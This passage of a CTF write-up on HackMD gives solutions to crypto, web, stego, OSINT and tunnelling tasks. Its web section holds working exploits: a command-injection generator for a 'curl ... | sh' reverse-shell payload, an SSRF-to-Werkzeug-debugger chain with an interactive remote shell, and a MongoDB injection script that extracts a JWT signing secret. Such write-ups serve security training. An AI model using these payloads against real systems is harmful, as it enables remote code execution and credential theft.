+        if first == r1 and second == r2:
+            break
+        table.append(r1)
+        table.append(r2)
+    print(f&#39;Random table created in {iters} iterations&#39;)
+
+    table_ = []
+    for t in table:
+        n = (t &gt;&gt; 16) &amp; 0xffff
+        table_.append((n &gt;&gt; 8) &amp; 0xff)
+        table_.append(n &amp; 0xff)
+
+    return table_
+
+
+def solve(data, s):
+    print(&#39;Seed:&#39;, s)
+    table = create_random_table(s)
+    
+    table_str = &#39;&#39;
+    for i in table:
+        table_str += bin(i)[2:].zfill(8) + &#39;,&#39;
+    table_str = table_str[:-1]
+    
+    data_xored = [i ^ 0b11000011 for i in data] £0b11????11
+    data_xored_str = &#39;&#39;
+    for i in data_xored:
+        d = bin(i)[2:].zfill(8)
+        d = d[:2] + &#39;.&#39;*4 + d[6:]
+        data_xored_str += d + &#39;,&#39;
+    
+    data_xored_str = data_xored_str[:-1]
+    print(data_xored_str)
+
+    found = []
+    for m in re.finditer(data_xored_str, table_str):
+        found.append(m.start())
+
+    print(table_str[found[0]:found[0]+len(data)*8 + len(data)-1])
+    
+    if len(found) &gt; 1:
+        print(&#39;warning: multiple variants&#39;)
+
+    positions = [len(table_str[:i].split(&#39;,&#39;))-1 for i in found]
+    keys = []
+    for pos in positions:
+        key = table[pos:pos + len(data)]
+        keys.append(key)
+    return keys
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((IP, PORT))
+print(sock.recv(76))
+print(sock.recv(30))
+print(sock.recv(48))
+print(sock.recv(23))
+seed = int(time.time())
+data = sock.recv(16)
+print(seed, list(data))
+keys = solve(data, seed)
+print(keys)
+print(sock.recv(30))
+data = sock.recv(48)
+print(data)
+
+print(&#39;Data:&#39;, list(data))
+iv = data[:16]
+text = data[16:]
+
+unpad = lambda s: s[:-s[len(s) - 1]]
+
+for key in keys:
+    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)
+    decrypted = unpad(cipher.decrypt(text))
+    print(decrypted)
+```
+
+
+# Web
+
+## Yerevan blog
+
+Author: @Nmikryukov
+
+- `/dashboard` in html comments
+- javascript checks for cookie `admin=true`. Set it manually
+- Local File Read in `/get_qr?uname=../../etc/passwd`
+- find python script location from `/get_qr?uname=../../proc/self/cmdline` and examine sources
+
+```python=
+ids = request.get_json()
+cmd = &#34;&#34;
+for id in ids:
+    cmd += f&#34;qrencode -o uploads/{username_by_id(id)} {int(time())}-{id[:7]};\n&#34;
+print(cmd, end=&#34;\n\n&#34;)
+system(cmd)
+```
+
+Input from client goes to system() which leads to RCE. Payload is limited to 7 bytes, but multiple payloads can be executed in one command. On of the solutions is to use the fact that output is written to QR code (username `None` when user is not found). The problem is that qr is one for all and it is often overwritten. General solution is to execute reverse shell without using output from QR or any disk write.
+
+It is possible to craft payload using env vars concatenation:
+
+![](https://i.imgur.com/lI9p9LV.png)
+
+Command from env var should not contain symbols `|&lt;&gt;&#34;&#39;$` (pipes, redirects, quotes). One of the solutions is to request shell code by http and execute it.
+
+Code below generates input for payload `curl https://reverse-shell.sh/x.x.x.x:8989 | sh`
+```python3=
+from string import ascii_letters
+
+shell = &#39;curl https://reverse-shell.sh/x.x.x.x:8989&#39;
+letters = set(shell)
+mapping = {}
+for l, s in zip(letters, ascii_letters):
+    mapping[l] = s
+    if l == &#39; &#39;:
+        continue
+
+exploit = []
+for m in mapping:
+    if m != &#39; &#39;:
+        exploit.append(f&#34;{mapping[m]}={m}&#34;)
+    else:
+        exploit.append(f&#34;{mapping[m]}=&#39; &#39;&#34;)
+exploit.append(&#34;Z=&#39;&#39;&#34;)
+for i in shell:
+    exploit.append(f&#34;Z=$Z${mapping[i]}&#34;)
+
+# shell | sh
+exploit.append(&#34;Y=&#39;&#39;&#34;)
+exploit.append(f&#34;Y=$Y${mapping[&#39;s&#39;]}&#34;)
+exploit.append(f&#34;Y=$Y${mapping[&#39;h&#39;]}&#34;)
+exploit.append(&#39;$Z|$Y&#39;)
+print(&#39;&#34;;&#39; + &#39;&#34;,\n&#34;;&#39;.join(exploit) + &#39;&#34;&#39;)
+```
+
+
+
+## Shashlik forum
+
+ssrf in thread creation
+file read in internal admin allows recover flask pin
+CVE-2019-9740 allows set cookies
+
+exploit:
+```python=
+from bs4 import BeautifulSoup
+import urllib.parse
+import requests
+import sys
+import os
+
+if len(sys.argv) != 2:
+    print(f&#39;[!] Usage: {sys.argv[0]} url&#39;)
+    exit()
+
+url = sys.argv[1]
+print(url)
+s = requests.Session()
+
+def register(username, password):
+    csrf = BeautifulSoup(s.get(url + &#39;/register&#39;).content, &#39;lxml&#39;).find(&#39;input&#39;, {&#39;name&#39;: &#39;csrf_token&#39;})[&#39;value&#39;]
+    s.post(url + &#39;/register&#39;, data={&#39;csrf_token&#39;: csrf, 
+        &#39;username&#39;: username,
+        &#39;password&#39;: password, 
+        &#39;password2&#39;: password, 
+        &#39;submit&#39;: &#39;Register&#39;})
+
+def login(username, password):
+    csrf = BeautifulSoup(s.get(url + &#39;/login&#39;).content, &#39;lxml&#39;).find(&#39;input&#39;, {&#39;name&#39;: &#39;csrf_token&#39;})[&#39;value&#39;]
+    s.post(url + &#39;/login&#39;, data={&#39;csrf_token&#39;: csrf, 
+        &#39;username&#39;: username, 
+        &#39;password&#39;: password,
+        &#39;submit&#39;: &#39;Sign+In&#39;})
+
+def ssrf(remote_url):
+    csrf = BeautifulSoup(s.get(url + &#39;/create_theme&#39;).content, &#39;lxml&#39;).find(&#39;input&#39;, {&#39;name&#39;: &#39;csrf_token&#39;})[&#39;value&#39;]
+    thread_url = s.post(url + &#39;/create_theme&#39;, data={&#39;csrf_token&#39;: csrf, 
+        &#39;theme_name&#39;: &#39;testAAAAAAAAAAAA&#39;, 
+        &#39;body&#39;: &#39;test&#39;,
+        &#39;is_private&#39;: &#39;y&#39;,
+        &#39;url&#39;: remote_url,
+        &#39;submit&#39;: &#39;Create+theme&#39;}, files={&#39;file&#39;:open(&#39;empty.png&#39;, &#39;rb&#39;)}).history[0].headers[&#39;Location&#39;]
+    file_url = BeautifulSoup(s.get(thread_url).content, &#39;lxml&#39;).find_all(&#39;img&#39;)[-1][&#39;src&#39;]
+    file = s.get(url + file_url).content
+    csrf = BeautifulSoup(s.get(thread_url).content, &#39;lxml&#39;).find(&#39;input&#39;, {&#39;name&#39;: &#39;csrf_token&#39;})[&#39;value&#39;]
+    s.post(url + &#39;/delete_thread/&#39; + thread_url.split(&#39;/&#39;)[-1], data={&#39;csrf_token&#39;: csrf, &#39;submit1&#39;: &#39;Delete+thread&#39;})
+    return file
+
+register(&#39;asd123123&#39;, &#39;asd123123&#39;)
+login(&#39;asd123123&#39;, &#39;asd123123&#39;)
+file = ssrf(&#39;http://admin:5000/image?img=asd#.png&#39;)
+error_bs = BeautifulSoup(file, &#39;lxml&#39;)
+secret = error_bs.find_all(&#39;script&#39;)[-1].string.split(&#39;\n&#39;)[-2].split(&#39;&#34;&#39;)[-2]
+print(f&#39;[+] Debug secret: {secret}&#39;)
+flask_path = error_bs.find_all(&#39;cite&#39;, {&#39;class&#39;: &#39;filename&#39;})[0].string.replace(&#39;&#34;&#39;, &#39;&#39;)
+print(f&#39;[+] Flask path: {flask_path}&#39;)
+username = error_bs.find_all(&#39;cite&#39;, {&#39;class&#39;: &#39;filename&#39;})[-1].string.split(&#39;/&#39;)[2]
+print(f&#39;[+] Username: {username}&#39;)
+
+boot_id = ssrf(&#39;http://admin:5000/image?img=/proc/sys/kernel/random/boot_id#.png&#39;).decode(&#39;utf-8&#39;).strip()
+print(f&#39;[+] boot_id: {boot_id}&#39;)
+
+cgroup = ssrf(&#39;http://admin:5000/image?img=/proc/self/cgroup#.png&#39;).decode(&#39;utf-8&#39;).strip().split(&#39;\n&#39;)[0].rpartition(&#34;/&#34;)[2]
+print(f&#39;[+] cgroup: {cgroup}&#39;)
+
+boot_id += cgroup
+
+mac_address = str(int(&#39;0x&#39; + ssrf(&#39;http://admin:5000/image?img=/sys/class/net/eth0/address#.png&#39;).decode(&#39;utf-8&#39;).strip().replace(&#39;:&#39;, &#39;&#39;), 16))
+print(f&#39;[+] MAC address: {mac_address}&#39;)
+
+pin, cookie = os.popen(f&#39;python3 gen_pin.py {username} {flask_path} {mac_address} {boot_id}&#39;).read().split(&#39;,&#39;)
+print(f&#39;[+] pin: {pin}&#39;)
+print(f&#39;[+] Cookie: {cookie}&#39;)
+
+ssrf(f&#39;http://admin:5000/console#.png&#39;)
+out = ssrf(f&#39;http://admin:5000/console?=&amp;__debugger__=yes&amp;cmd=import+os;os.popen(&#34;id&#34;).read()&amp;frm=0&amp;s={secret} HTTP/1.1\r\nCookie: {cookie}\r\nTEST: 123#.png&#39;).split(b&#39;&amp;#x27;&#39;)[1].decode(&#39;utf-8&#39;).replace(&#39;\\n&#39;, &#39;&#39;)
+print(out)
+
+print(&#39;\n[+++] SPAWNING PSEDU-SHELL (type \&#39;exit\&#39; to exit) [+++]&#39;)
+
+while True:
+    cmd = input(&#39;$ &#39;)
+    if cmd == &#34;exit&#34;:
+        exit()
+    out = ssrf(f&#39;http://admin:5000/console?=&amp;__debugger__=yes&amp;cmd=import+os;os.popen(&#34;{urllib.parse.quote_plus(cmd)}&#34;).read()&amp;frm=0&amp;s={secret} HTTP/1.1\r\nCookie: {cookie}\r\nTEST: 123#.png&#39;).split(b&#39;&amp;#x27;&#39;)[1].decode(&#39;utf-8&#39;).replace(&#39;\\n&#39;, &#39;\n&#39;)
+    print(out)
+```
+
+## The wall
+
+Author: @passkeyra
+
+During exploring the web we find the endpoint `/clearBricks` in the js function in file http://51.250.81.57:8081/static/js/thewall.js that is not used anywhere, but has quite suspicious parameters sent to it. Also, every user has a cookie access_token with JWT with fields sub (contains username) and bricks_key_path that contains a path to the file with user key to decrypt the bricks (`secrets/&lt;user id&gt;`).
+
+Let&#39;s look at the /clearBreaks. It takes the following json data: `{&#39;args&#39;: [&#39;delete&#39;, &#39;bricks&#39;], &#39;kwargs&#39;: {&#39;deletes&#39;:[{&#39;q&#39;:{&#39;username&#39;: username}, &#39;limit&#39;:0}]}}` which means that we execute the command `delete` on mongodb collection `bricks` with parameter `deletes = [{&#39;q&#39;:{&#39;username&#39;: username}, &#39;limit&#39;:0}]`, but it responds with 500. Now it is pretty clear that it executes the database level operation with the `command` function (https://pymongo.readthedocs.io/en/stable/api/pymongo/database.html#pymongo.database.Database.command). We can try to execute a command `listCollections` using the json `{&#34;args&#34;:[&#34;listCollections&#34;],&#34;kwargs&#34;:{}}` and get the answer with information about database response length. We can try to change filters and get responses with different lengths. So, now we can retrieve the data from the MongoDB with regexes by looking at the database response length. We get collections `[&#39;users&#39;, &#39;bricks&#39;, &#39;jwt_secret&#39;]` and the `secret` value from the jwt_secret collection. Also, we could find an admin user with id 1 in `users`. Exploit:
+
+```python=
+#!/usr/bin/env python3
+import requests
+import string
+import json
+
+letters = string.ascii_letters + string.digits + &#39;_-&#39;
+
+endpoint = &#39;http://127.0.0.1:8081/clearBricks&#39;
+
+cookies = {&#39;access_token_cookie&#39;: &#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0OTU3OTkwOSwianRpIjoiZjYyZjAyZDEtMDI1YS00NDcxLTg5NmEtMzEyYmIyYWFmNjg4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFzZCIsIm5iZiI6MTY0OTU3OTkwOSwiZXhwIjoxNjQ5NTg5OTA5LCJicmlja3Nfa2V5X3BhdGgiOiJzZWNyZXRzLzMifQ.mqkCTBlb02HeatxvALeY3WThQxOL9qUhEaAUCpMKQs0&#34;}
+
+def get_next_letter(request, prev_count, ts=88):
+    n = []
+    for i in letters:
+        data = request.replace(&#34;**payload**&#34;, &#39;^&#39;+&#39;.&#39;*prev_count+i)
+        data = json.loads(data)
+        r = requests.post(endpoint, cookies=cookies, json=data)
+        if r.status_code == 200 and r.json()[&#39;db_response_length&#39;] &gt; ts:
+            n.append(i)
+    return n
+
+def get_next_by_list(request, prev, l, ts=88):
+    n = []
+    for i in l:
+        data = request.replace(&#34;**payload**&#34;, &#34;^&#34;+prev+i)
+        data = json.loads(data)
+        r = requests.post(endpoint, cookies=cookies, json=data)
+        if r.status_code == 200 and r.json()[&#39;db_response_length&#39;] &gt; ts:
+            n.append(prev+i)
+    return n
+
+
+lets = []
+for i in range(20):
+    tmp = get_next_letter(&#39;{&#34;args&#34;:[&#34;listCollections&#34;],&#34;kwargs&#34;:{&#34;filter&#34;:{&#34;name&#34;:{&#34;$regex&#34;: &#34;**payload**&#34;}}}}&#39;, i)
+    if not tmp:
+        break
+    lets.append(tmp)
+
+
+dumps = []
+variants = lets[0]
+for i in range(1, len(lets)):
+    tmp_variants = []
+    for j in variants:
+        n = get_next_by_list(&#39;{&#34;args&#34;:[&#34;listCollections&#34;],&#34;kwargs&#34;:{&#34;filter&#34;:{&#34;name&#34;:{&#34;$regex&#34;: &#34;**payload**&#34;}}}}&#39;, j, lets[i])
+        tmp_variants += n
+    if len(tmp_variants) &lt; len(variants):
+        dumps += variants
+    variants = tmp_variants
+
+dumps += variants
+
+fields = []
+for i in dumps:
+    data = {&#34;args&#34;:[&#34;find&#34;, i], &#34;kwargs&#34;: {}}
+    r = requests.post(endpoint, cookies=cookies, json=data)
+    if r.status_code == 200 and r.json()[&#39;db_response_length&#39;] &gt; 74:
+        fields.append(i)
+
+print(fields)
+
+# Enumerate fields using the request:
+# data = {&#34;args&#34;:[&#34;find&#34;, &#34;jwt_secret&#34;],&#34;kwargs&#34;:{&#34;filter&#34;:{&#34;username&#34;:{&#34;$where&#34;:&#34;function () { var findKey = new RegExp(&#39;^**payload**&#39;); function inspectObj(doc) { return Object.keys(doc).some(function(key) { if ( typeof(doc[key]) == &#39;object&#39; ) { return inspectObj(doc[key]);}else { return findKey.test(key);}});}return inspectObj(this);}&#34;}}}
+# https://stackoverflow.com/questions/44254923/search-by-regex-on-field-name
+#
+# got &#39;secret&#39; field
+
+def get_data_from_field(coll_name, field_name, prev_count):
+    letters_data = string.ascii_letters + string.digits + &#39;_-./\\=+&#39;
+    d = []
+    for i in letters_data:
+        if i in &#39;_-./\\=+&#39;:
+            i = &#39;\\&#39;+i
+        data = {&#34;args&#34;:[&#34;find&#34;, coll_name],&#34;kwargs&#34;:{&#34;filter&#34;:{field_name:{&#34;$regex&#34;: &#34;^&#34;+&#39;.&#39;*prev_count+i}}}}
+        r = requests.post(endpoint, cookies=cookies, json=data)
+        if r.status_code == 200 and r.json()[&#39;db_response_length&#39;] &gt; 78:
+            d.append(i)
+    return d
+
+
+dump = []
+for i in range(100):
+    data = get_data_from_field(&#39;jwt_secret&#39;, &#39;secret&#39;, i)
+    if not data:
+        break
+    dump.append(data)
+
+print(dump)
+secret = &#39;&#39;
+for i in dump:
+    if len(i[0]) == 2:
+        secret += i[0][1]
+    else:
+        secret += i[0]
+
+print(secret)
+```
+
+After that we can change sub to `admin` and bricks_key_path to `secrets/1` in JWT and sign it. Finally, log in as admin and see the flag on bricks
+
+# Stego
+
+## S.O.S
+
+Author: @passkeyra
+
+Look at the traffic and dump all files that was sent by HTTP. There are `script.py` and `track1.wav` (The Police &#34;Message in the bottle&#34;). In the script there is Triple DES encryption of the flag with knowing key and then an addition of the encrypted data to the channels buffer in the track. We can look at the first bytes and find repetitions of them in the start of buffer, so, probably there were zeros at the beginning of the file and the solution is quite simple
+
+![](https://i.imgur.com/C5Uwgny.png)
+
+```python=
+#!/usr/bin/env python3
+import pydub
+import numpy as np
+from Crypto.Cipher import DES3
+
+key = b&#39;&amp;\xc8\xba\xda\xc7\x9b\xea\xba\x97\xd3@\x13/\xdf%8g\xf7# \x85\x8fp&amp;&#39;
+
+def read(f, normalized=False):
+    a = pydub.AudioSegment.from_mp3(f)
+    y = np.array(a.get_array_of_samples())
+    if a.channels == 2:
+        y = y.reshape((-1, 2))
+    if normalized:
+        return a.frame_rate, np.float32(y) / 2**15
+    else:
+        return a.frame_rate, y
+
+def write(f, sr, x, normalized=False):
+    channels = 2 if (x.ndim == 2 and x.shape[1] == 2) else 1
+    if normalized:
+        y = np.int16(x * 2 ** 15)
+    else:
+        y = np.int16(x)
+    song = pydub.AudioSegment(y.tobytes(), frame_rate=sr, sample_width=2, channels=channels)
+    song.export(f, format=&#34;mp3&#34;, bitrate=&#34;320k&#34;)
+
+sx, x = read(&#39;track1.wav&#39;)
+
+data = []
+for i in range(100):
+    data.append(x[i][i%2])
+
+c = 5
+while data[c:c+5] != data[:5]:
+    c += 1
+
+encrypted = bytes(data[:c])
+
+cipher1 = DES3.new(key, DES3.MODE_CFB, encrypted[:8])
+print(cipher1.decrypt(encrypted[8:]))
+```
+
+# Osint
+
+## Find Church
+
+Authors: @molberte
+
+Task description asks to find the chuch and cafe nearby. 
+
+Easy way to determine the place: 
+You can notice hotel &#34;Marriott&#34; on the pic, which is pretty luxury hotel. Also there are mountains on the horizont line. Which implies that there is ski resort nearby. Putting it all together gives us the &#34;marriott ski resort church&#34; Google search, which ends up with Tsaghkadzor Marriott Hotel
+![](https://i.imgur.com/V8p4qFs.png)
+
+Long way to determine the place:
+Search for the church by Google or Yandex image search:
+![](https://i.imgur.com/UIkBA2L.png)
+![](https://i.imgur.com/8GbpXM6.jpg)
+![](https://i.imgur.com/Ye1HJ1n.png)
+
+Make sure that it&#39;s Kecharis Monastery, search for it on Google map and find cafe nearby and it&#39;s menu right there. You are done!
+
+
+
+
+
+## Welcome to Ararat
+
+Authors: @Nmikryukov
+
+Description of the task says that the flag is hidden by one of the organizers and it is necessary to use passive intelligence to find it. The most likely place is a social network or a messenger. In InnoCTF chat all organizers are admins. [@Nmikryukov](https://t.me/Nmikryukov) account has a line status `=oQfzMmbldWMsx2M05WSfNjVxM3c0A3e0FmchJXQ`. It looks like base64 but has padding in the beginning, which is unusual. It is necessary to reverse and decode this string from base64.
+![](https://i.imgur.com/edU8XRE.png)
+
+# PPC
+
+## Capsules
+
+Author: @Nmikryukov
+
+Traffic dump has two tcp streams. In first stream client simply recieved login and password (port is already closed). Second stream has SSH traffic encapsulated in HTTP requests and responses. The goal of this task is to write encapsulator in order to be able to negotiate with SSH server.
+
+```python=
+#!/usr/bin/python3
+import socket
+from select import select
+from _thread import *
+from base64 import b64encode, b64decode
+import argparse
+from time import sleep
+
+&#34;&#34;&#34;
+CLIENT1 &lt;-&gt; lower_socket &lt;-&gt;       &lt;-&gt; upper_socket &lt;-&gt;
+CLIENT2 &lt;-&gt; lower_socket &lt;-&gt; PROXY &lt;-&gt; upper_socket &lt;-&gt; SERVER
+CLIENT3 &lt;-&gt; lower_socket &lt;-&gt;       &lt;-&gt; upper_socket &lt;-&gt;
+
+Clients are connected to current proxy using lower sockets.
+Upper sockets are used to interact with some external server (should support multiple connections).
+Proxy can work in encapsulator mode - encapsulate from lower to upper sockets and decapsulate back
+    or in decapsulator mode in reverse direction
+&#34;&#34;&#34;
+
+parser = argparse.ArgumentParser()
+parser.add_argument(&#39;--up_ip&#39;, type=str, help=&#39;upper server ip&#39;, required=True)
+parser.add_argument(&#39;--up_port&#39;, type=int, help=&#39;upper server port&#39;, required=True)
+parser.add_argument(&#39;--low_port&#39;, type=int, help=&#39;lower listener port&#39;, required=True)
+parser.add_argument(&#39;--decapsulator&#39;, default=False, action=&#34;store_true&#34;, help=&#39;proxy should decapsulate&#39;)
+args = parser.parse_args()
+
+UPPER_SERVER = (args.up_ip, args.up_port)
+LOWER_LISTENER = (&#39;0.0.0.0&#39;, args.low_port)
+encapsulator = not args.decapsulator  # should current proxy encapsulate or decapsulate data from lower sockets
+
+
+def encapsulate(data):
+    data = b64encode(data).decode()
+    line1 = &#34;POST / HTTP/1.1&#34; if encapsulator else &#34;HTTP/1.1 200 OK&#34;
+    line2 = &#34;Host: capsule&#34; if encapsulator else &#34;Server: Apache&#34;
+    return f&#34;{line1}\n&#34; \
+           f&#34;{line2}\n&#34; \
+           f&#34;Content-Type: application/octet-stream\n&#34; \
+           f&#34;Content-Length: {len(data) + 1}\n\n&#34; \
+           f&#34;{data}\n&#34;.encode()
+
+
+def decapsulate(data):
+    lines = data.split(b&#39;\n&#39;)
+    try:
+        return b64decode(lines[5])
+    except Exception as e:
+        return None
+
+
+def multi_threaded_client(lower_sock):
+    buffer = b&#39;&#39;  # need buffer because tcp segment can contain only part of http body
+    upper_sock = socket.socket()
+    upper_sock.connect(UPPER_SERVER)
+    while True:
+        try:
+            inputs = [lower_sock, upper_sock]
+            input_ready, _, except_ready = select(inputs, [], inputs)
+            if len(except_ready) &gt; 0:
+                raise Exception
+            for s in input_ready:
+                if s is lower_sock:
+                    data = lower_sock.recv(2**20)
+                    if not data:
+                        raise Exception
+                    if not encapsulator:
+                        buffer += data
+                        if buffer[-1] != ord(&#39;\n&#39;):
+                            continue
+                        data = decapsulate(buffer)
+                        print(f&#34;&gt; {data}&#34;)
+                        upper_sock.sendall(data)
+                        buffer = b&#39;&#39;
+                    else:
+                        print(f&#34;&gt; {data}&#34;)
+                        data = encapsulate(data)
+                        upper_sock.sendall(data)
+                elif s is upper_sock:
+                    data = upper_sock.recv(2 ** 20)
+                    if not data:
+                        raise Exception
+                    if not encapsulator:
+                        print(f&#34;&lt; {data}&#34;)
+                        data = encapsulate(data)
+                        lower_sock.sendall(data)
+                    else:
+                        buffer += data
+                        if buffer[-1] != ord(&#39;\n&#39;):
+                            continue
+                        data = decapsulate(buffer)
+                        print(f&#34;&lt; {data}&#34;)
+                        lower_sock.sendall(data)
+                        buffer = b&#39;&#39;
+                sleep(0.1)  # can remove sleep and make proxy way faster, but I am too lazy to parse Content-Length
+        except Exception as e:
+            lower_sock.sendall(b&#34;Socket error\n&#34;)
+            upper_sock.sendall(b&#34;Socket error\n&#34;)
+            lower_sock.close()
+            upper_sock.close()
+            print(e)
+            break
+
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(LOWER_LISTENER)
+    server.listen()
+    print(&#34;Listening for connections...&#34;)
+    while True:
+        client, address = server.accept()
+        print(f&#39;New connection: {address[0]}&#39;)
+        start_new_thread(multi_threaded_client, (client,))
+
+```
+![](https://i.imgur.com/I52aN1x.png)
+
+
+---
+Thank u for your attention!
+
+
+
+![](https://i.imgur.com/CFiNFF3.jpg)
+
+</div>
+
+    <div class="document-footer container-fluid hmd-pb-2 hidden-print">
+        <hr>
+        <div class="footer hmd-flex hmd-items-center">
+    <div class="footer__published-by hmd-flex-grow-1">
+        <span>Published on</span> <strong><a href="https://hackmd.io/" target="_blank"><i class="fa fa-file-text"></i> <span class="brand">HackMD</span></a></strong>
+    </div>
+    <div class="footer__views" style="margin-right: 18px;">
+        <i class="fa fa-eye"></i> <span class="ui-viewcount">853</span>
+    </div>
+    <div class="footer__views">
+    
+        <a class="ui-signin community-button" href="HyYTA0J45.html#"><span><i class="fa fa-fw fa-heart-o"></i><span class="text hidden-xs">Like</span><span class="count"></span></span></a>
+        <a class="ui-signin community-button" href="HyYTA0J45.html#"><span><i class="fa fa-fw fa-bookmark-o"></i><span class="text hidden-xs">Bookmark</span></span></a>
+        <a class="ui-signin community-button" href="HyYTA0J45.html#"><span><i class="fa fa-fw fa-bell-o"></i><span class="text hidden-xs">Subscribe</span></span></a>
+    
+    </div>
+</div>
+
+    </div>
+
+    <div class="ui-community unselectable hidden-print hidden-xs" style="display: none;">
+        
+            <a class="ui-signin community-button" href="HyYTA0J45.html#" title="Like" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span><i class="fa fa-fw fa-heart-o"></i><span class="count hmd-ml-2"></span></span></a>
+            <a class="ui-signin community-button" href="HyYTA0J45.html#" title="Bookmark" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span><i class="fa fa-fw fa-bookmark-o"></i></span></a>
+            <a class="ui-signin community-button" href="HyYTA0J45.html#" title="Subscribe" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span ><i class="fa fa-fw fa-bell-o"></i></span></a>
+        
+    </div>
+
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-left dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="HyYTA0J45.html#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+            </ul>
+        </div>
+    </div>
+
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="display:none;"></div>
+    
+
+    <div class="clearfix"></div>
+
+    <!-- signin modal -->
+<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
+            
+
+
+
+
+
+
+    
+
+
+
+
+
+
+<h3>Sign in</h3>
+
+<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded">
+    <div class="hmd-dn"><input type="hidden" name="_csrf" value="Neni0DWd-ylZLQ5vf0QB08VmWDaZ_E8zzD9U"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
+    <div class="form-group  ">
+        <label for="email" class="control-label">Email</label>
+        <label for="inputEmail" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="display: inline;"></span>
+        <div class="input-block">
+            
+                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
+            
+            <span class="error-sign"></span>
+        </div>
+    </div>
+    <div class="form-group ">
+        <label for="password" class="control-label">Password</label>
+        <label for="inputPassword" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="display: inline;"></span>
+        <div class="input-block">
+            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password">
+            <span class="error-sign"></span>
+            
+                <span class="control-label pull-right" style="font-size: 13px; margin-top: 5px;"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
+            
+        </div>
+    </div>
+
+    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
+        
+            <input type="submit" class="btn btn-success btn-large" formaction="https://hackmd.io/login" value="Sign in">
+        
+
+        
+    </div>
+</form>
+
+
+
+
+
+
+
+
+    
+        <p class="separator">or</p>
+    
+
+    
+        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
+    
+
+    <div class="social-buttons-container">
+    
+    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
+        <i class="fa fa-facebook"></i> Sign in via Facebook
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
+        <i class="fa fa-twitter"></i> Sign in via Twitter
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
+        <i class="fa fa-github"></i> Sign in via GitHub
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
+        <i class="fa fa-dropbox"></i> Sign in via Dropbox
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/google" class="btn btn-lg btn-block btn-social btn-google">
+        <i class="icon icon-google"></i> Sign in via Google
+    </a>
+    
+    
+    
+</div>
+
+
+
+
+
+    <div >
+        <p>New to HackMD? <a href="https://hackmd.io/join">Sign up</a></p>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60728495-1"></script>
+<script nonce="da2c10eb-1e2e-4b50-9371-9a413d0a44f7">
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
+    gtag('config', 'UA-60728495-1', {'user_id': userid});
+</script>
+<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
+<script nonce="da2c10eb-1e2e-4b50-9371-9a413d0a44f7">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>
+
+
+    
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+
+    <script src="../api/i18n.js"></script>
+     <script src="https://assets.hackmd.io/build/font-vendor.5ba1bda23ba5a8acfb08.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.a47b470427920f6a2576.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.decf7c2d22439b5c1f16.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.42870335f965b58e4642.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.5d87630b4c994a8aa4be.js" defer="defer"></script>
+
+    
+
+</body>
+</html>
